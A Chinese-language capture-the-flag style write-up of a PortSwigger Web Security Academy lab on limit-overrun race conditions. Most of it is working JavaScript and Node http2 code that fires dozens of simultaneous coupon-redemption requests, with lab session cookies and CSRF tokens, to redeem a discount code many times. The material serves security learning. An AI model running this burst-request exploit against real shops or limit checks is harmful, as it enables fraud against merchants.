---
title: Race conditions
description: Race conditions
---

## Lab: Limit overrun race conditions

| Dimension | Description                                                                            |
| --------- | -------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/race-conditions#limit-overrun-race-conditions     |
| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun |

這題很簡單，就是要同時送出很多個兌換碼的 HTTP Request，但很可惜，但要在瀏覽器控制併行送出多個請求會比較困難

```js
const couponForm = document.getElementById("coupon-form");
const sp = new URLSearchParams();
sp.append("csrf", "hJBGfUUwkgeehlxTw7z4T2IuBGB7nBOy");
sp.append("coupon", "PROMO20");
function applyCoupon() {
  return fetch(couponForm.action, {
    method: "post",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: sp.toString(),
  });
}
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
```

稍微調整一下，改用 NodeJS 試試看

```js
const couponForm = document.getElementById("coupon-form");
const sp = new URLSearchParams();
sp.append("csrf", "hJBGfUUwkgeehlxTw7z4T2IuBGB7nBOy");
sp.append("coupon", "PROMO20");
function applyCoupon() {
  return fetch(
    "https://0a1c00990378dd4680117b6b00a700ae.web-security-academy.net/cart/coupon",
    {
      method: "post",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Cookie: "session=oQf2bCYK3mMzTQnM3OP1YuZbr6mNFlen",
      },
      body: sp.toString(),
    },
  );
}
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
applyCoupon();
```

結果更廢，大概只有 成功兌換 1 ~ 2 張折價券，看來需要尋找一個可以併行送出多個請求的 script 或工具

後來嘗試用 NodeJS 的 http2 模組，成功率有大幅上升，可惜我還沒寫 HTTP2 的文章，就要先碰到 HTTP2 的知識QQ

```ts
import http2, { ClientHttp2Session } from "http2";

const client1 = http2.connect(
  "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
);
const client2 = http2.connect(
  "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
);
const sp = new URLSearchParams();
sp.append("csrf", "eR7LzJBiKxvQVa8HadtAQcjUw6iYeWtN");
sp.append("coupon", "PROMO20");
const body = sp.toString();
const contentLength = Buffer.byteLength(body);

function applyCoupon(client: ClientHttp2Session, idx: number) {
  const request = client.request({
    ":method": "POST",
    ":path": "/cart/coupon",
    "Content-Type": "application/x-www-form-urlencoded",
    Cookie: "session=D3JPEkSb1gMHkQY9BjgzZZCqZm5kxXN0",
    "Content-Length": contentLength,
  });
  request.end(body);
  // const chunks: any[] = []
  request.on("response", (headers) => {
    const isSuccess =
      headers.location === "/cart" && headers[":status"] === 302;
    console.log({ isSuccess, client: idx % 2 === 0 ? "client1" : "client2" });
  });
  // request.on('data', (chunk) => chunks.push(chunk))
  // request.on('end', () => console.log(Buffer.concat(chunks).toString('utf8')))
}

Array(40)
  .fill(0)
  .map((_, idx) =>
    idx % 2 === 0 ? applyCoupon(client1, idx) : applyCoupon(client2, idx),
  );
```

成功解題，雖然不是每次都能穩穩地兌換 10 幾張折價券，但至少成功率比 fetch 高太多了

後來我看了解答，發現 Burp Repeater 也可以做到同樣的事情，且不用寫任何程式碼，也是蠻方便的

## 參考資料

- https://portswigger.net/web-security/race-conditions
